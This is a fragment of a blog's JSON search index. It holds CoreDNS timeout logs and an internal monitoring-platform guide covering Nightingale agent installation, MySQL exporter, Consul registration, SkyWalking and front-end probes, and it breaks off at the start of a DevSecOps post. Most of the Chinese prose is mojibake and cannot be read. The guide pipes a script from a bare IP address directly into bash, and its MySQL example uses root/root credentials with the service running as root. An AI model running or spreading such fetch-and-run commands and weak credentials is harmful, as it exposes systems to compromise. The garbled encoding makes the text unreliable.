plugin&#x2F;errors: 2 2703006067149038797.9108278204234463322.in-addr.arpa. HINFO: dial tcp 10.233.0.3:53: connect: network is unreachable  \n\n[ERROR] plugin&#x2F;errors: 2 4398450128437385198.8090046149832042955.cluster.local. HINFO: dial tcp 10.233.0.3:53: connect: network is unreachable  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. A: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. AAAA: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 2703006067149038797.9108278204234463322.in-addr.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 5032635697405930385.8744131853810691353.ip6.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 4398450128437385198.8090046149832042955.cluster.local. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. A: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 localhost.weave.svc.cluster.local. AAAA: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 4398450128437385198.8090046149832042955.cluster.local. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 5032635697405930385.8744131853810691353.ip6.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out  \n\n[ERROR] plugin&#x2F;errors: 2 2703006067149038797.9108278204234463322.in-addr.arpa. HINFO: dial tcp 10.233.0.3:53: connect: connection timed out\nè§£å†³æ–¹æ¡ˆä¿®æ”¹nodelocaldns.yamlé…ç½®æ¸…å•ä½¿ç”¨IPV6éœ€è¦æŠŠÂ é…ç½®è¡Œ L70ä¿®æ”¹ä¸ºï¼š â€œhealth [__PILLAR__LOCAL__DNS__]:8080â€œã€‚å‚åŠ [[NodeLocalDNSCache]]\nå‚è€ƒK8S ä¸­çš„ Grafana æ•°æ®æŒä¹…åŒ– - è€³ä¸œ-Erdong - åšå®¢å›­\n","slug":"DeepFlow","date":"2021-09-18T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"å®‰è£…æ‰‹å†Œ,DeepFlow,å¯è§‚æµ‹æ€§","author_index":"Moses"},{"id":"89d5cf8a319b3740168525b9ad32b4e4","title":"ç›‘æ§å¹³å°æ­å»º","content":"å‰è¨€   éšç€åº”ç”¨å®¹å™¨åŒ–å’Œå¾®æœåŠ¡çš„å…´èµ·ï¼Œå€Ÿç”± Dockerå’Œ Kubernetesç­‰å·¥å…·ï¼ŒæœåŠ¡çš„å¿«é€Ÿå¼€å‘å’Œéƒ¨ç½²æˆä¸ºå¯èƒ½ï¼Œæ„å»ºå¾®æœåŠ¡åº”ç”¨å˜å¾—è¶Šæ¥è¶Šç®€å•ã€‚ä½†æ˜¯éšç€å¤§å‹å•ä½“åº”ç”¨æ‹†åˆ†ä¸ºå¾®æœåŠ¡ï¼ŒæœåŠ¡ä¹‹é—´çš„ä¾èµ–å’Œè°ƒç”¨å˜å¾—æä¸ºå¤æ‚ï¼Œè¿™äº›æœåŠ¡å¯èƒ½æ˜¯ä¸åŒå›¢é˜Ÿå¼€å‘çš„ï¼Œå¯èƒ½åŸºäºä¸åŒçš„è¯­è¨€ï¼Œå¾®æœåŠ¡ä¹‹é—´å¯èƒ½æ˜¯åˆ©ç”¨ RPCã€RESTful APIï¼Œä¹Ÿå¯èƒ½æ˜¯é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å®ç°è°ƒç”¨æˆ–é€šè®¯ã€‚å¦‚ä½•ç†æ¸…æœåŠ¡ä¾èµ–è°ƒç”¨å…³ç³»ã€å¦‚ä½•åœ¨è¿™æ ·çš„ç¯å¢ƒä¸‹å¿«é€Ÿ debugã€è¿½è¸ªæœåŠ¡å¤„ç†è€—æ—¶ã€æŸ¥æ‰¾æœåŠ¡æ€§èƒ½ç“¶é¢ˆã€åˆç†å¯¹æœåŠ¡çš„å®¹é‡è¯„ä¼°éƒ½å˜æˆä¸€ä¸ªæ£˜æ‰‹çš„äº‹æƒ…ã€‚\nMetrices   äº§å“åŠŸèƒ½å¯¹æ¯”\n\n\n\nå¯¹æ¯”é¡¹\nNightingale\nPrometheus\nZabbix\nSkywalking\n\n\n\nå±•ç¤ºæ–¹é¢\næ”¯æŒå³æ—¶çœ‹æ¿ã€ç›‘æ§å¤§ç›˜\néœ€è¦é…åˆç¬¬ä¸‰æ–¹å±•ç¤ºå·¥å…·ã€Grafana\næ¯”è¾ƒå¤å¤ï¼Œä¸æ”¯æŒå¤šä¸ªæŒ‡æ ‡æ”¾åˆ°ä¸€å¼ å›¾é‡Œå±•ç¤ºï¼Œä¸æ”¯æŒåŒç¯æ¯”ç­‰å±•ç¤ºæ–¹å¼\næ”¯æŒå¤§å±çœ‹æ¿ï¼Œä½†æ˜¯ä¸å¤ªç›´è§‚ï¼Œè¾ƒæ–°\n\n\næ˜“ç”¨æ€§æ–¹é¢\nå¤§éƒ¨åˆ†æ“ä½œéƒ½å¯åœ¨é¡µé¢å®Œæˆï¼Œå…¼ç”¨prometheusç”Ÿæ€\nè®¾è®¡ä¸Šåå·¥å…·ï¼Œç­–ç•¥é…ç½®ã€é‡‡é›†é…ç½®éƒ½æ˜¯ç¼–è¾‘yamlæ–‡ä»¶ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œéœ€è¦äºŒæ¬¡æ·±åº¦åŒ…è£…\n\n\n\n\nä¸šåŠ¡ç›‘æ§\næ•°æ®ç»“æ„çµæ´»ï¼Œæ”¯æŒSDKåŸ‹ç‚¹ã€ç«¯ä¸Šæ—¥å¿—è§£æ\nä¸»è¦æ˜¯SDKåŸ‹ç‚¹æ–¹å¼ï¼Œä¸æ”¯æŒæ—¥å¿—è§£æï¼Œæ‰‹æ®µç›¸å¯¹å•ä¸€\nZabbixç”±äºæ•°æ®ç»“æ„è¾ƒä¸ºç®€å•ï¼Œä¸æ”¯æŒæŒ‡æ ‡æ ‡ç­¾ï¼Œä¸šåŠ¡æŒ‡æ ‡èšåˆæ¯”è¾ƒéš¾æ\n\n\n\nè¿ç»´ä½“ç³»\nå®Œå¤‡çš„ç”¨æˆ·æƒé™ä½“ç³»\nè®¾è®¡ä¸Šåå·¥å…·ï¼Œè¿ç»´ä½“ç³»æ–¹é¢çš„è®¾è®¡è€ƒè™‘è¾ƒå°‘ï¼Œéœ€è¦äºŒæ¬¡æ·±åº¦åŒ…è£…\n\n\n\n\næŠ¥è­¦æ–¹é¢\nç”Ÿäº§çº§çµæ´»ï¼Œé¡µé¢æ“ä½œç›´æ¥é€‰æ‹©å‘Šè­¦äººå’Œå‘Šè­¦å›¢é˜Ÿ\næ•´ä½“è¾ƒä¸ºçµæ´»ï¼Œåªæ˜¯é…ç½®å¤æ‚ï¼Œå­¦ä¹ æˆæœ¬é«˜ï¼Œæ— é¡µé¢æ”¯æŒï¼Œç›´æ¥ç¼–è¾‘yamlæ–‡ä»¶\næ•´ä½“è¾ƒä¸ºçµæ´»ï¼Œé…ç½®å¤æ‚ï¼Œå­¦ä¹ æˆæœ¬é«˜\n\n\n\nTracingæ–¹æ¡ˆå¯¹æ¯”\n\n\n\næ–¹æ¡ˆ\nJaeger\nZipkin\nApache SkyWalking\nCAT\nPinpoint\nElastic APM\n\n\n\nå¼€å‘è¯­è¨€\nGo\nJava\nJava\nJava\nJava\nGo\n\n\nGithub Star\n14.1k+\n14.6k+\n17.6k+\n15.8k+\n11.6k+\n400+\n\n\nèƒŒåç»„ç»‡\nCNCF Uber\nApache\nApache\nç¾å›¢\nNAVER\nElastic\n\n\n\n\nTwitter\n\n\n\n\n\n\nä¾µå…¥æ€§\nä¸­\né«˜\nä½\né«˜\nä½\nå¾ˆä½\n\n\nOpenTracing\næ˜¯\næ˜¯\næ˜¯\nå¦\nå¦\nä¸å®Œå–„\n\n\næ”¯æŒå®¢æˆ·ç«¯\njava\njava\njava\njava\njava\ngo\n\n\n\ngo\ngo\n.net core\nc&#x2F;c++\nphp\njava\n\n\n\npython\npython\nnodejs\npython\n\nnodejs\n\n\n\nnodejs\nc#\nphp\nnodejs\n\npython\n\n\n\nc++&#x2F;c\nphpç­‰\n\ngo\n\nruby\n\n\nUIä¸°å¯Œåº¦\nä¸­\nä¸­\nè¾ƒé«˜\né«˜\né«˜\nä¸­\n\n\nç›‘æ§æŠ¥è­¦\næ— ï¼Œéœ€è¦ç»“åˆå…¶ä»–å·¥å…·\næ— ï¼Œéœ€è¦ç»“åˆå…¶ä»–å·¥å…·\næ”¯æŒ\næ”¯æŒ\næ”¯æŒ\næ”¯æŒ\n\n\näºŒæ¬¡å¼€å‘éš¾åº¦\nä½\nä¸­\nä¸­\né«˜\né«˜\né«˜\n\n\nå­˜å‚¨ç±»å‹\nMemory\nMemory\nH2\nHDFS\nHBase\nElasticsearch\n\n\n\nCassandra\nCassandra\nElasticsearch\n\n\n\n\n\n\nElasticsearch\nElasticsearch\nMysql\n\n\n\n\n\n\nKafka\nMysql\nTiDB\n\n\n\n\n\nç›‘æ§èŒƒå›´\næŒ‡æ ‡ç›‘æ§\n\n\n\n\n** æœåŠ¡ç±»å‹**\næœåŠ¡åç§°\nç›‘æ§é¡¹\n\n\n\nå¤§æ•°æ®\nElasticsearch\nåŒ…æ‹¬é›†ç¾¤&#x2F;ç´¢å¼•&#x2F;èŠ‚ç‚¹ç­‰ç›‘æ§\n\n\nå¼€å‘è¯­è¨€\nJVM\nåŒ…æ‹¬ Heap&#x2F;thread&#x2F;gc&#x2F;cpu&#x2F;file ç­‰ç›‘æ§\n\n\nä¸­é—´ä»¶\nkafka\nåŒ…æ‹¬ Broker&#x2F;topic&#x2F;consumer Group ç­‰ç›‘æ§\n\n\nåŸºç¡€è®¾æ–½\nLinux\nåŒ…æ‹¬ Cpu Api Server&#x2F;dns&#x2F;workload&#x2F;network ç­‰ç›‘æ§\n\n\n\nKubernetes\nkubermetrics\n\n\næ•°æ®åº“\nMysql\nåŒ…æ‹¬ç½‘ç»œ&#x2F;è¿æ¥æ•°&#x2F;æ…¢æŸ¥è¯¢ç­‰\n\n\n\nRedis\nåŒ…æ‹¬å†…å­˜ä½¿ç”¨ç‡&#x2F;è¿æ¥æ•°&#x2F;å‘½ä»¤æ‰§è¡Œæƒ…å†µç­‰ç›‘æ§\n\n\n\nMongodb\nåŒ…æ‹¬æ–‡æ¡£æ•°&#x2F;è¯»å†™æ€§èƒ½&#x2F;ç½‘ç»œæµé‡ç­‰\n\n\nå·¡æ£€\nå¥åº·å·¡æ£€\né€šè¿‡ Blackbox å®šæœŸå¯¹ç›®æ ‡æœåŠ¡è¿›è¡Œè¿é€šæ€§æµ‹è¯•ï¼ŒæŒæ¡æœåŠ¡çš„å¥åº·çŠ¶å†µï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸\n\n\n\nåº”ç”¨æ€§èƒ½è§‚æµ‹\n\nç—›ç‚¹ï¼šéšç€ä¸šåŠ¡ä¸æ–­å‘å±•ï¼Œä¸šåŠ¡é€»è¾‘å’ŒæœåŠ¡è°ƒç”¨æ—¥ç›Šå¤æ‚ã€‚å¯¼è‡´åº”ç”¨æ€§èƒ½é—®é¢˜åˆ†æä¸å®šä½æ—¥ç›Šè‰°éš¾ï¼Œç»™ç›‘æ§è¿ç»´å¸¦æ¥äº†å·¨å¤§çš„æŒ‘æˆ˜ï¼šåº”ç”¨ä¹‹é—´çš„ä¾èµ–å…³ç³»å¤æ‚ï¼Œéš¾ä»¥æ¢³ç†ã€‚è°ƒç”¨é“¾è·¯é•¿ï¼Œæ’æŸ¥å’Œå®šä½ç¾¤ä½“å›°éš¾ã€‚æ¥å£è°ƒç”¨ã€æ•°æ®åº“è°ƒç”¨å…³ç³»å¤æ‚ï¼Œç®¡ç†éš¾åº¦å¤§ã€‚  \n\nè§£å†³æ–¹æ¡ˆï¼šåŸºäºåº”ç”¨æ‹“æ‰‘è‡ªåŠ©å‘ç°ï¼Œå®šä½æ€§èƒ½ç“¶é¢ˆã€‚åŸºäºå…³é”®æ€§èƒ½æŒ‡æ ‡å¯¹æ¯”ï¼Œä¼˜åŒ–åº”ç”¨æ€§èƒ½ã€‚æ ¹æ®æŒ‡æ ‡å˜åŒ–è¶‹åŠ¿é…ç½®å‘Šè­¦ï¼ŒåŠæ—¶äº†è§£å¼‚å¸¸ã€‚  \n\nå‰ç«¯æ€§èƒ½ç›‘æ§ä¸»è¦å…³æ³¨ç”¨æˆ·é¡µé¢æ€§èƒ½ï¼ˆé¡µé¢æµ‹é€Ÿï¼Œæ¥å£æµ‹é€Ÿï¼ŒCDN æµ‹é€Ÿç­‰ï¼‰å’Œè´¨é‡ï¼ˆJS é”™è¯¯ï¼ŒAjax é”™è¯¯ç­‰ï¼‰\n\n\næœåŠ¡å™¨ç›‘æ§å®‰è£…agentdè®¿é—®åœ°å€ï¼š å¤œèº ï¼Œä½¿ç”¨è‡ªå·±çš„OAè´¦å·ç›´æ¥ç™»å½•  \nå®‰è£…n9e-agentdï¼ˆæ³¨æ„ï¼šæœåŠ¡å™¨æ˜¯centos7ï¼‰\n&#96;curl -s http:&#x2F;&#x2F;116.85.64.82&#x2F;install_n9e_agentd.sh|bash\né€šè¿‡ä¸‹é¢å‘½ä»¤æŸ¥çœ‹n9e-agentdçš„è¿›ç¨‹ï¼Œå¦‚æœè¿›ç¨‹å­˜åœ¨ï¼Œè¯´æ˜å¯åŠ¨æˆåŠŸå¦‚æœå¯åŠ¨å¤±è´¥ï¼Œå¯é€šè¿‡journalctl -u n9e-agentd -fæŸ¥çœ‹æ—¥å¿—\nps -ef|grep n9e-agentd|grep -v grep\nå®‰è£…å®Œæˆä¹‹å ä¿®æ”¹&#x2F;opt&#x2F;n9e&#x2F;agentd&#x2F;etc&#x2F;agentd.yamlä¸­çš„æœåŠ¡ç«¯è¿æ¥åœ°å€ï¼ˆæœç´¢endpointå…³é”®å­—ï¼‰ï¼Œç„¶åé‡å¯n9e-agentdå³å¯\nvi &#x2F;opt&#x2F;n9e&#x2F;agentd&#x2F;etc&#x2F;agentd.yaml&#96;\n\n# ä¿®æ”¹endpoint\nendpoints:\n  - http:&#x2F;&#x2F;metrics-monitor.ruijie.com.cn:8000\n  \n # é‡å¯n9e-agentd\n systemctl restart n9e-agentd&#96; \n\n\né…ç½®å‘Šè­¦åˆ›å»ºç­–ç•¥åˆ†ç»„ï¼Œç„¶ååœ¨åˆ†ç»„ä¸‹æ–°å»ºå‘Šè­¦ç­–ç•¥  \nä¸­é—´ä»¶ç›‘æ§è®¿é—®åœ°å€ï¼š å¤œèº ï¼Œä½¿ç”¨è‡ªå·±çš„OAè´¦å·ç›´æ¥ç™»å½•  \næ¥å…¥Mysqlç›‘æ§ä¸‹è½½mysqld_exporter\n&#96;tar -xvf mysqld_exporter-0.13.0.linux-amd64.tar.gz\nmv mysqld_exporter-0.13.0.linux-amd64 mysqld_exporter\ncd mysqld_exporter\n# åˆ›å»ºmysqlè¿æ¥é…ç½®æ–‡ä»¶\n&#96;&#96;&#96;confid\nvi .my.cnf\n[client]\nhost&#x3D;127.0.0.1\nport&#x3D;3306\nuser&#x3D;root\npassword&#x3D;root\n\n# åˆ›å»º systemd unit æ–‡ä»¶\n&#96;vi &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mysqld_exporter.service&#96;\n\n[Unit]\nDescription&#x3D;mysqld_exporter\nDocumentation&#x3D;https:&#x2F;&#x2F;prometheus.io&#x2F;\nAfter&#x3D;network.target\n\n[Service]\nType&#x3D;simple\nUser&#x3D;root\nExecStart&#x3D;&#x2F;home&#x2F;mysqld_exporter&#x2F;mysqld_exporter --config.my-cnf&#x3D;&#x2F;home&#x2F;mysqld_exporter&#x2F;.my.cnf\nRestart&#x3D;on-failure\n\n[Install]\nWantedBy&#x3D;multi-user.target&#96; \nå¯åŠ¨æœåŠ¡\nsystemctl daemon-reload\nsystemctl enable mysqld_exporter.service\nsystemctl start mysqld_exporter.service\nè¿è¡ŒçŠ¶æ€\nsystemctl status mysqld_exporter.service\n\næ­£å¸¸èµ·æ¥åå°±å¯ä»¥è®¿é—®http://IP:9104/metrics  \né…ç½®Promethues Job1 åˆ›å»ºmysql-exporter.jsonæ–‡ä»¶\n&#96;&#123;\n  &quot;ID&quot;: &quot;xxx-mysql-xx&quot;, &#x2F;&#x2F; é¡¹ç›®å-mysql-æœåŠ¡å™¨ip\n  &quot;Name&quot;: &quot;xxx-mysql-xx&quot;,\n  &quot;Tags&quot;: [\n    &quot;mysql-exporter&quot; &#x2F;&#x2F; ç±»å‹\n  ],\n  &quot;Address&quot;: &quot;172.16.22.xxx&quot;, mysqlæœåŠ¡å™¨ip\n  &quot;Port&quot;: 9104, &#x2F;&#x2F; mysqld-exporter æš´éœ²çš„ç«¯å£\n  &quot;Meta&quot;: &#123;\n    &quot;app&quot;: &quot;ces-mysql-109&quot;,\n    &quot;team&quot;: &quot;tow_group&quot;,\n    &quot;project&quot;: &quot;ces&quot;\n  &#125;,\n  &quot;EnableTagOverride&quot;: false,\n  &quot;Check&quot;: &#123;\n    &quot;HTTP&quot;: &quot;http:&#x2F;&#x2F;172.16.22.109:9104&#x2F;metrics&quot;, &#x2F;&#x2F; mysqld-exporter æš´éœ²çš„åœ°å€\n    &quot;Interval&quot;: &quot;10s&quot;\n  &#125;,\n  &quot;Weights&quot;: &#123;\n    &quot;Passing&quot;: 10,\n    &quot;Warning&quot;: 1\n  &#125;\n&#125;&#96; \n2 æ³¨å†Œåˆ°consulä¸­å¿ƒ  \ncurl --request PUT --data @mysql-exporter.json http:&#x2F;&#x2F;172.16.36.32:8500&#x2F;v1&#x2F;agent&#x2F;service&#x2F;register?replace-existing-checks&#x3D;1\n3 æŸ¥çœ‹åœ°å€consul\nç¡®è®¤æ˜¯å¦æ‹‰å–åˆ°targetPromethues\nçœ‹æ¿å±•ç¤ºé…ç½®å‘Šè­¦æ¥å…¥Redisç›‘æ§æ¥å…¥ElasticSearchç›‘æ§æ¥å…¥å¥åº·å·¡æ£€é…ç½®Jobä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œè¯·æä¾›é¡¹ç›®çš„å¥åº·ç›‘æµ‹åœ°å€ï¼Œå¦‚ï¼šhttps://www.ruijie.com.cn/demo/healthcheckï¼Œé…ç½®å®Œæˆåå³å¯åœ¨[Grafana](http://metrics-monitor.ruijie.com.cn:3000/d/xtkCtBkiz/jian-kang-xun-jian-da-ping-kan-ban?orgId=1&amp;refresh=10s)ä¸­æŸ¥çœ‹  \né…ç½®å‘Šè­¦å…ˆåˆ›å»ºç­–ç•¥åˆ†ç»„ï¼Œç­–ç•¥åˆ†ç»„åç§°ä»¥ï¼ˆä¸šåŠ¡ç»„-é¡¹ç›®åç§°ï¼‰å‘½å ç„¶åå†å½“å‰ç­–ç•¥åˆ†ç»„ä¸‹æ–°å»ºå‘Šè­¦ç­–ç•¥\næ¥å…¥Spring Bootç›‘æ§ä¿®æ”¹åº”ç”¨çš„ä¾èµ–åŠé…ç½®æ­¥éª¤1ï¼šä¿®æ”¹ pom ä¾èµ–é¡¹ç›®ä¸­å·²ç»å¼•ç”¨ spring-boot-starter-web çš„åŸºç¡€ä¸Šï¼Œåœ¨ pom.xml æ–‡ä»¶ä¸­æ·»åŠ  actuator&#x2F;prometheus Maven ä¾èµ–é¡¹ã€‚\n&#96;&lt;dependency&gt;\n  &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;\n&lt;&#x2F;dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;io.micrometer&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;micrometer-registry-prometheus&lt;&#x2F;artifactId&gt;\n&lt;&#x2F;dependency&gt;&#96; \næ­¥éª¤2ï¼šä¿®æ”¹é…ç½®ç¼–è¾‘ resources ç›®å½•ä¸‹çš„ application.yml æ–‡ä»¶ï¼Œä¿®æ”¹ actuator ç›¸å…³çš„é…ç½®æ¥æš´éœ² Prometheus åè®®çš„æŒ‡æ ‡æ•°æ®ã€‚\n&#96;management:\n  endpoints:\n    web:\n      exposure:\n        include: prometheus  # æ‰“å¼€ Prometheus çš„ Web è®¿é—® Path\n  metrics:\n    # ä¸‹é¢é€‰é¡¹å»ºè®®æ‰“å¼€ï¼Œä»¥ç›‘æ§ http è¯·æ±‚çš„ P99&#x2F;P95 ç­‰ï¼Œå…·ä½“çš„æ—¶é—´åˆ†å¸ƒå¯ä»¥æ ¹æ®å®é™…æƒ…å†µè®¾ç½®\n    distribution:\n      sla:\n        http:\n          server:\n            requests: 1ms,5ms,10ms,50ms,100ms,200ms,500ms,1s,5s\n    # åœ¨ Prometheus ä¸­æ·»åŠ ç‰¹åˆ«çš„ Labels\n    tags:\n      # å¿…é¡»åŠ ä¸Šå¯¹åº”çš„åº”ç”¨åï¼Œå› ä¸ºéœ€è¦ä»¥åº”ç”¨çš„ç»´åº¦æ¥æŸ¥çœ‹å¯¹åº”çš„ç›‘æ§\n      application: spring-boot-mvc-demo&#96; \næ­¥éª¤3ï¼šæœ¬åœ°éªŒè¯åœ¨é¡¹ç›®å½“å‰ç›®å½•ä¸‹ï¼Œè¿è¡Œ mvn spring-boot:run ä¹‹åï¼Œå¯ä»¥é€šè¿‡ http://localhost:8080/actuator/prometheus è®¿é—®åˆ° Prometheus åè®®çš„æŒ‡æ ‡æ•°æ®ï¼Œè¯´æ˜ç›¸å…³çš„ä¾èµ–é…ç½®å·²ç»æ­£ç¡®ã€‚\nå…¶ä»– Exporter æ¥å…¥å¦‚æœæ‰€ä½¿ç”¨çš„åŸºç¡€ç»„ä»¶è¿˜æ²¡æœ‰æä¾›ç›¸åº”çš„é›†æˆæ–¹å¼ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹æ–¹å¼è¿›è¡Œé›†æˆï¼ŒåŠè‡ªå®šä¹‰ç›‘æ§å¤§å±æ¥æ»¡è¶³ç›¸åº”çš„ç›‘æ§éœ€æ±‚ã€‚å¼€æºç¤¾åŒº Exporter åˆ—è¡¨\né“¾è·¯è·Ÿè¸ªç›‘æ§å‡çº§é¡¹ç›®ä¸­çš„Dockerfileå°† é¡¹ç›® &gt; docker &gt; Dockerfile æ›¿æ¢ä¸ºä»¥ä¸‹å†…å®¹ï¼Œç„¶åä»æ–°å‘å¸ƒåº”ç”¨\nFROM  registry.choerodon.ruijie.com.cn&#x2F;cibase&#x2F;jdk:1.8.0-v5\n \nRUN mkdir -p &#x2F;usr&#x2F;local&#x2F;app \\\\\n    &amp;&amp; mkdir -p &#x2F;data&#x2F;logs \n\t\nCOPY  app.jar &#x2F;usr&#x2F;local&#x2F;app&#x2F;\n\nENV app_run_in_docker_registerport 80\n\nENV LANG C.UTF-8 \n\nEXPOSE 8080\nCMD [&quot;&#x2F;var&#x2F;java&#x2F;bin&#x2F;java&quot;,&quot;-Dserver.port&#x3D;8080&quot;,&quot;-jar&quot;,&quot;&#x2F;usr&#x2F;local&#x2F;app&#x2F;app.jar&quot;]\nCMD &#x2F;var&#x2F;java&#x2F;bin&#x2F;java -javaagent:&#x2F;usr&#x2F;local&#x2F;app&#x2F;skywalking_agent_zy&#x2F;skywalking-agent.jar -Dskywalking.agent.service_name&#x3D;$&#123;release&#125; -Dskywalking.collector.backend_service&#x3D;$&#123;sywalkingService&#125; -Dspring.profiles.active&#x3D;$&#123;env&#125; -Dserver.port&#x3D;8080 -jar &#x2F;usr&#x2F;local&#x2F;app&#x2F;app.jar&#96; \næœåŠ¡æŸ¥çœ‹è¿›å…¥ skywalking æŸ¥çœ‹ç›‘æ§çŠ¶æ€\nk8sç›‘æ§è®¿é—®Grafana  \nå‰ç«¯ç›‘æ§Vueæ¥å…¥webfunnyè®¿é—®åœ°å€ï¼šå‰ç«¯ç›‘æ§\næ·»åŠ å¹³å°ç”¨æˆ·\nè‡ªè¡Œæ³¨å†Œ\n\næ·»åŠ ç›‘æ§æ¢é’ˆ 1ã€ åœ¨vueå‰ç«¯index.htmlä¸­å¢åŠ æ¢é’ˆ3ã€ æ¢é’ˆåœ°å€æ”¹ä¸º\nhttps://captcha.ruijie.com.cn/webfunny/w.js \n4ã€ å½“ç„¶å¯ä»¥æ ¹æ®æ„å»ºç¯å¢ƒå»æ·»åŠ æ¢é’ˆ\n&#96;&lt;% if (process.env.NODE_ENV !&#x3D;&#x3D; &#39;development&#39;) &#123; %&gt;      &lt;script&gt;      (function(f)&#123;var e&#x3D;f.sessionStorage;if(e)&#123;e.CUSTOMER_WEB_MONITOR_ID&#x3D;&quot;ã€æ¢é’ˆIDã€‘&quot;;var d&#x3D;document.createElement(&quot;script&quot;);d.async&#x3D;1;d.src&#x3D;&quot;https:&#x2F;&#x2F;captcha.ruijie.com.cn&#x2F;webfunny&#x2F;w.js&quot;;var g&#x3D;document.getElementsByTagName(&quot;script&quot;)[0];g.parentNode.insertBefore(d,g)&#125;&#125;)(window);      &lt;&#x2F;script&gt;     &lt;% &#125; %&gt;&#96; \nè®¿é—®å‰ç«¯ç›‘æ§å³å¯æŸ¥çœ‹ç›‘æ§å†…å®¹\nè‡ªå®šä¹‰æŒ‡æ ‡å‘Šè­¦è‡ªå®šä¹‰æŒ‡æ ‡ä¸»åŠ¨ä¸ŠæŠ¥ç›´æ¥çœ‹ä½¿ç”¨curlå‘½ä»¤ä¸ŠæŠ¥æ•°æ®çš„ä¾‹å­å³å¯ï¼Œå¦‚æœæ˜¯å…¶ä»–è¯­è¨€ç¿»è¯‘ä¸€ä¸‹å°±å®Œäº†ã€‚ç›‘æ§æŒ‡æ ‡ç»„ç»‡ä¸ºjson listæ ¼å¼ï¼Œæ”¾åˆ°http request bodyä¸­ï¼Œpostç»™n9e-serverå³å¯ã€‚\n&#96;&#96;#!&#x2F;bin&#x2F;bash\n[[author]]:lixiang\n[[email]]:xiang_li@ruijie.com.cn\n\n[[http]]ä¸ŠæŠ¥æŒ‡æ ‡ç¤ºä¾‹\n\nurl&#x3D;&quot;http:&#x2F;&#x2F;metrics-monitor.ruijie.com.cn:8000&#x2F;v1&#x2F;n9e&#x2F;push&quot;   # è¯·æ±‚æ¥å£\nmetric&#x3D;&quot;mysql_back_status&quot;        # æŒ‡æ ‡åç§°\nvalue&#x3D;1                   # å€¼\ntimestamp&#x3D;&#96;date +%s&#96;      # æ—¶é—´æˆ³\n\n#è¯·æ±‚å‚æ•°\nbody&#x3D;&#39;[&#123;\n  &quot;metric&quot;: &quot;&#39;$&#123;metric&#125;&#39;&quot;,\n  &quot;value&quot;: &#39;$&#123;value&#125;&#39;,\n  &quot;tags&quot;: &#123;\n            &quot;system-name&quot;: &quot;ecp&quot;\n        &#125;,\n  &quot;time&quot;: &#39;$&#123;timestamp&#125;&#39;\n&#125;]&#39;\n\necho -e &quot;è¯·æ±‚å‚æ•°:\\n $body \\n\\nè¿”å›ç»“æœ:&quot;\n&#96;&#96;&#96;sh\n#å‘é€è¯·æ±‚\ncurl -X POST &quot;$url&quot; \\\n    -H &#39;Content-Type: application&#x2F;json&#39; \\\n    -d &quot;$body&quot;&#96;&#96; \nå…¶ä¸­å„ä¸ªå­—æ®µçš„å«ä¹‰å‚è€ƒã€Š ã€ŒDataModelã€- https://n9e.didiyun.com/docs/appendix/datamodel/ ã€‹ä¸€ç« ï¼Œidentã€aliaså­—æ®µæ˜¯å¯é€‰çš„ï¼Œå¾ˆå¤šæƒ…å½¢çš„ç›‘æ§æ•°æ®æ˜¯æ²¡æ³•å’Œè®¾å¤‡å…³è”åœ¨ä¸€èµ·çš„ï¼Œæ¯”å¦‚æŸä¸ªåŸŸåçš„è¯ä¹¦è¿‡æœŸæ—¶é—´ï¼Œè¿™ç§ç›‘æ§æ•°æ®å°±å¯ä»¥ä¸ä¼ identã€aliaså­—æ®µã€‚  \né…ç½®å‘Šè­¦ä¸Šä¸€æ­¥ä¸­æˆ‘ä»¬è‡ªå®šä¹‰äº†ä¸€ä¸ªæŒ‡æ ‡ä¸ºmysql_back_statusï¼Œç„¶ååœ¨å‘Šè­¦ç­–ç•¥ä¸­å®šä¹‰  \næœªæ¥è§„åˆ’\né«˜å¯ç”¨\nåŠ¨æ€åŒ–å¯¼å…¥job\nå‘Šè­¦è§„åˆ™\n\nhttphttps://grafana.com/grafana/dashboards/7587\nmysql\nã€ENDã€‘\n","slug":"ç›‘æ§å¹³å°","date":"2021-09-10T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"DeepFlow,å¯è§‚æµ‹æ€§,skywalking","author_index":"Moses"},{"id":"b970fe5bee1957a85fe7360386c990fe","title":"é€šè¿‡è‡ªå»ºDevSecOpsç¯å¢ƒå­¦ä¹ ","content":"å‰å¯¼çŸ¥è¯†\nç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼šGit Jenkins    \næŒç»­é›†æˆä¸æŒç»­äº¤ä»˜ï¼šCI&#x2F;CD \nåˆ¶å“ä»“åº“ç®¡ç†ï¼šArtifactoryã€Nexus\nIaCï¼ŒåŸºç¡€è®¾æ–½ç®¡ç†é…ç½®ç®¡ç†å·¥å…·\nå…¬æœ‰äº‘ç§æœ‰äº‘ç›¸å…³æŠ€æœ¯ç»„ä»¶\n\nDevSecOpså¹³å°æ­å»ºDevSecOps-StudioDevSecOps-StudioåŒ…å«çš„æŠ€æœ¯ç»„ä»¶é€‰å‹ä¸»è¦æœ‰ï¼š 